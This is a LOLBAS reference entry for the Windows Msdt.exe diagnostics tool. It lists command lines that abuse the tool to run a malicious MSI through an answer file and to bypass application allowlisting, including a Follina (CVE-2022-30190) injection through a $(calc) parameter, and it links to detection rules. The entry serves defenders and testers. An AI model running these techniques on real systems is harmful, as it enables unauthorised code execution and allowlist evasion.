---
Acknowledgement:
- Person: Nasreddine Bencherch
Author: Oddvar Moe
Code_Sample:
- Code: https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/PCW8E57.xml
Commands:
- Category: Execute
  Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
    /skip TRUE
  Description: Executes the Microsoft Diagnostics Tool and executes the malicious
    .MSI referenced in the .xml file.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: MSI
  Usecase: Execute code
- Category: AWL Bypass
  Command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
    /skip TRUE
  Description: Executes the Microsoft Diagnostics Tool and executes the malicious
    .MSI referenced in the .xml file.
  MitreID: T1218
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: MSI
  Usecase: Execute code bypass Application whitelisting
- Category: AWL Bypass
  Command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu
    IT_BrowseForFile=/../../$(calc).exe"
  Description: Executes arbitrary commands using the Microsoft Diagnostics Tool and
    leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific
    technique will not work on a patched system with the June 2022 Windows Security
    update.
  MitreID: T1202
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Tags:
  - Application: GUI
  - Execute: CMD
  Usecase: Execute code bypass Application allowlisting
Created: 2018-05-25
Description: Microsoft diagnostics tool
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
- Elastic: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
Full_Path:
- Path: C:\Windows\System32\Msdt.exe
- Path: C:\Windows\SysWOW64\Msdt.exe
Name: Msdt.exe
Resources:
- Link: https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
- Link: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- Link: https://twitter.com/harr0ey/status/991338229952598016
- Link: https://twitter.com/nas_bench/status/1531944240271568896
mitre_data:
  technique_ids:
  - T1218
  - T1202
tags:
- lolbas/osbinaries
---

# Msdt.exe

Microsoft diagnostics tool

# Path(s)

- `C:\Windows\System32\Msdt.exe`
- `C:\Windows\SysWOW64\Msdt.exe`

# AWL Bypass Commands

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

```batch
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

- **Usecase:** Execute code bypass Application whitelisting
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.

```batch
msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe"
```

- **Usecase:** Execute code bypass Application allowlisting
- **Privileges Required:** User
- **MitreID:** `T1202`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Execute Commands

Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.

```batch
msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE
```

- **Usecase:** Execute code
- **Privileges Required:** User
- **MitreID:** `T1218`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
- https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- https://twitter.com/harr0ey/status/991338229952598016
- https://twitter.com/nas_bench/status/1531944240271568896
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Nasreddine Bencherch